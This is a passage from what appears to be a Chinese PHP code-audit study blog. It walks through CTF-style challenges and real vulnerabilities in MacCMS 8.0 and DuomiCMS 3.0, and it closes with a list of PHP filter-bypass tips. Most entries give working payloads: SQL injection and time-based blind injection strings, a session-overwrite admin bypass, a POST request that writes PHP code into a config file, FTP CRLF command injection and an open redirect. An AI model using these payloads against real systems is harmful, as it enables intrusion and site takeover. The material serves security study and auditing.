      }
      public function sanitizeInput($input, $length = 20) {
        $input = addslashes($input);
        if (strlen($input) > $length) {
          $input = substr($input, 0, $length);
        }
        return $input;
      }
    }
    $auth = new LoginManager($_POST['user'], $_POST['passwd']);
    if (!$auth->isValid()) {
      exit;
  * 题解
**实例化一个LoginManager类名，接收用户传递的user，passwd两个参数，并通过isValid方法判断是否合法，sanitizeInput方法，通过addslashes方法进行过滤，再截取20位返回。**
  * addslashes
    作用：在单引号（'）、双引号（"）、反斜线（\）与 NUL（ NULL 字符）字符之前加上反斜线
  * substr 
    string substr ( string $string , int $start [, int $length ] )
**返回字符串 string 由 start 和 length 参数指定的子字符串。**
  * user
    1234567890123456789'
  * sql 
    select count(p) from user where user = '1234567890123456789\' AND password = 'or 1=1#'
  * payload 
    user=1234567890123456789'&passwd=or 1=1#
## 苹果CMS视频分享程序 8.0
  * 环境搭建
#### 漏洞分析
  * inc/common/template.php:754
**$lp['wd']直接拼接SQL语句，造成SQL注入**
  * inc/module/vod.php:96
  * inc/common/function.php:266
**对传进来的参数进行过滤**
在 _$res=isset($_REQUEST[$key]) ? $magicq ? $_REQUEST[$key] :
@addslashes($_REQUEST[$key]) : '';_ 中可以知道wd参数是通过REQUEST方法获取的然后进行过滤。
  * inc/common/360_safe3.php:27
**跟踪chkSql函数**
_将传进来的参数进行urldecode解码之后，通过StopAttack方法，最后通过htmlEncode方法，最后返回。_
  * inc/common/360_safe3.php:12
_跟进StopAttack方法，使用preg_match方法进行过滤_
  * inc/common/360_safe3.php:57  
_跟踪$getfilter方法_
  * inc/common/function.php:572
_跟踪一下htmlEncode方法，针对 & 、 ' 、 空格 、 " 、 TAB 、 回车 、 换行 、 大于小于号 等符号进行实体编码转换_
  * inc/common/template.php:560
_而 wd 是可以从 REQUEST 中获取到，所以wd 实际上是可控的。_
  * 漏洞思路
_SQL注入点是字符型注入，htmlEncode方法实体编码了单引号，最后进行了url解码操作，可以通过双编码绕过，htmlEncode方法没有过滤反斜杠，而addslashes方法会过滤反斜杠。_
  * 构造SQL
    wd=))||if((select%0b(select(m_name)``from(mac_manager))regexp(0x5e61)),(`sleep`(3)),0)#%25%35%63
## 从变量覆盖到getshell
### Snowman
  * code
    class Carrot {
      const EXTERNAL_DIRECTORY = '/tmp/';
      private $id;
      private $lost = 0;
      private $bought = 0;
      public function __construct($input) {
        $this->id = rand(1, 1000);
        foreach ($input as $field => $count) {
          $this->$field = $count++;
        }
      }
      public function __destruct() {
        file_put_contents(
          self::EXTERNAL_DIRECTORY . $this->id,
          var_export(get_object_vars($this), true)
        );
      }
    }
    $carrot = new Carrot($_GET);
  * payload 
    id=shell.pho&shell=',)%0a//
  * 测试
### DuomiCMS_3.0
  * 环境搭建
#### 漏洞分析
  * duomiphp/common.php:52
_查看全局变量注册代码_
    foreach(Array('_GET','_POST','_COOKIE') as $_request)
    {
        foreach($$_request as $_k => $_v) ${$_k} = _RunMagicQuotes($_v);
    }
  * duomiphp/common.php:36
_查看_RunMagicQuotes方法, _RunMagicQuotes 函数将特殊符号，使用 addslashes 函数进行转义处理_
  * admin/admin_ping.php:13
_全剧追踪fwrite函数，$weburl与token来源于post，可控。_
_weburl 变量和 token 变量从
POST方式获取，经过了_RunMagicQuotes方法还有webscan.php的过滤，但是可以写shell_
**admin\admin_ping.php文件得需要admin身份才可以有访问权限写shell**
  * admin/config.php:28
  * duomiphp/check.admin.php:41
  * admin/login.php:62
  * duomiphp/check.admin.php:72
_跟进checkUser方法_
  * 登陆管理用户查看组
_可知用户组和userid均为1_  
  * 覆盖 session 的值
**重点注意这里git项目上的覆盖session有问题，可以使用这个payload**
    member/share.php?_SESSION[duomi_group_id]=1&_SESSION[duomi_admin_id]=1
  * payload
```POST /admin/admin_ping.php?action=set HTTP/1.1  
Host: www.test.com:8888  
Cache-Control: max-age=0  
Upgrade-Insecure-Requests: 1  
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36  
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,
_/_ ;q=0.8  
Accept-Encoding: gzip, deflate  
Accept-Language: zh-CN,zh;q=0.9  
Connection: close  
Content-Type: application/x-www-form-urlencoded  
Content-Length: 34
weburl=";phpinfo();//&token=
    - 测试
    ## $_SERVER['PHP_SELF']导致的防御失效问题
    ### Sleigh Ride
    - code 
    ```php
    class Redirect {
      private $websiteHost = 'www.example.com';
      private function setHeaders($url) {
        $url = urldecode($url);
        header("Location: $url");
      }
      public function startRedirect($params) {
        $parts = explode('/', $_SERVER['PHP_SELF']);
        $baseFile = end($parts);
        $url = sprintf(
          "%s?%s",
          $baseFile,
          http_build_query($params)
        );
        $this->setHeaders($url);
      }
    }
    if ($_GET['redirect']) {
      (new Redirect())->startRedirect($_GET['params']);
    }
  * 环境搭建
  * 题解
_代码实现的功能实则为一个URL跳转的功能，PHP_SELF 指当前的页面绝对地址。_
  * payload
    /index.php/http:%252f%252fwww.syst1m.com?redirect=1
  * 测试
_跳转到了我的博客_  
## 深入理解$_REQUESTS数组
### Poem
  * code
    class FTP {
      public $sock;
      public function __construct($host, $port, $user, $pass) {
        $this->sock = fsockopen($host, $port);
        $this->login($user, $pass);
        $this->cleanInput();
        $this->mode($_REQUEST['mode']);
        $this->send($_FILES['file']);
      }
      private function cleanInput() {
        $_GET = array_map('intval', $_GET);
        $_POST = array_map('intval', $_POST);
        $_COOKIE = array_map('intval', $_COOKIE);
      }
      public function login($username, $password) {
        fwrite($this->sock, "USER " . $username . "\n");
        fwrite($this->sock, "PASS " . $password . "\n");
      }
      public function mode($mode) {
        if ($mode == 1 || $mode == 2 || $mode == 3) {
          fputs($this->sock, "MODE $mode\n");
        }
      }
      public function send($data) {
        fputs($this->sock, $data);
      }
    }
    new FTP('localhost', 21, 'user', 'password');
  * 题解
_mode是通过request传进来的，在cleanInput方法中将get、post、cookie传进来的全部通过intval函数过滤_
  * REQUEST
  * payload
    ?mode=1%0a%0dDELETE%20test.file
## Raw MD5 Hash引发的注入
### Turkey Baster
  * code 
    class RealSecureLoginManager {
      private $em;
      private $user;
      private $password;
      public function __construct($user, $password) {
        $this->em = DoctrineManager::getEntityManager();
        $this->user = $user;
        $this->password = $password;
      }
      public function isValid() {
        $pass = md5($this->password, true);
        $user = $this->sanitizeInput($this->user);
        $queryBuilder = $this->em->createQueryBuilder()
          ->select("COUNT(p)")
          ->from("User", "u")
          ->where("password = '$pass' AND user = '$user'");
        $query = $queryBuilder->getQuery();
        return boolval($query->getSingleScalarResult());
      }
      public function sanitizeInput($input) {
        return addslashes($input);
      }
      $c = new RealSecureLoginManager(
      $_POST['user'],
      $_POST['passwd']
    );
    if (!$auth->isValid()) {
      exit;
    }
  * md5(计算字符串的 MD5 散列值)
    string md5 ( string $str [, bool $raw_output = false ] )
  * 题解
_auth新建了一个RealSecureLoginManager对象，传进去POST的user和passwd。在md5方法中，如果可选的
raw_output 被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。_
  * fuzz
  * payload
    user= OR 1=1#&passwd=128
  * SQL 
    select count(p) from user s where password='vanlq\' and user=' OR 1=1#'
### 实例分析
  * 题目地址
    http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php
### 分析
  * 查看源代码
  * password
    md5($password,true)
  * payload
    password=ffifdyop或者129581926211651571912466741651878684928
  * 测试
## Tips整理
  * in_array
    第三个参数未设置为true,可利用弱类型比较绕过
  * filter_var（url过滤）
    未对协议进行校验，可利用xxx://绕过
  * class_exists
    当存在__autoload函数，会自动调用，如果类名可控，可造成危害，如果参数也可控，可利用内部函数进行攻击。
  * strpos
    strpos在没找到指定字符时会返回flase，如果第一个字符找到就返回0
  * filter_var (FILTER_VALIDATE_EMAIL)
    filter_var() 问题在于，我们在双引号中嵌套转义空格仍然能够通过检测。同时由于底层正则表达式的原因，我们通过重叠单引号和双引号，欺骗 filter_val() 使其认为我们仍然在双引号中，这样我们就可以绕过检测。
    ”aaa’aaa”@example.com
  * escapeshellarg与escapeshellcmd
    escapeshellarg与escapeshellcmd配合使用会存在绕过
  * parse_str
    parse_str的作用就是解析字符串并且注册成变量，它在注册变量之前不会验证当前变量是否存在，所以会直接覆盖掉当前作用域中原有的变量
  * preg_replace
    $pattern 存在 /e 模式修正符，允许代码执行
    /e 模式修正符，是 preg_replace() 将 $replacement 当做php代码来执行
  * extract 
    从数组中将变量导入到当前的符号表
  * readfile
    可利用 ../http/../../ 跳过目录（如检测关键字https是否存在）
  * 截断
    %00 遇到遇到函数过滤会成为\0
  * 反序列化
[PHP 反序列化漏洞学习](https://syst1m.com/post/php-deserialization/)
  * htmlentities 
    将字符转换为 HTML 转义字符
_ENT_COMPAT（默认值）：只转换双引号。  
ENT_QUOTES：两种引号都转换。  
ENT_NOQUOTES：两种引号都不转换。_
  * $_SERVER['REQUEST_URI'] 
    获取的参数是不会将参数中的特殊符号进行转换
  * HPP
    id=1&id=2 只会接收第二个参数
  * md5(计算字符串的 MD5 散列值)
    string md5 ( string $str [, bool $raw_output = false ] )
_在md5方法中，如果可选的 raw_output 被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。_
  * eregi截断漏洞
_ereg可用%00截断,要求php <5.3.4_
    ereg编码%00时发生截断,不会检查%00后面的字符(%00算作1个字符)
  * ssrf 
[ us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)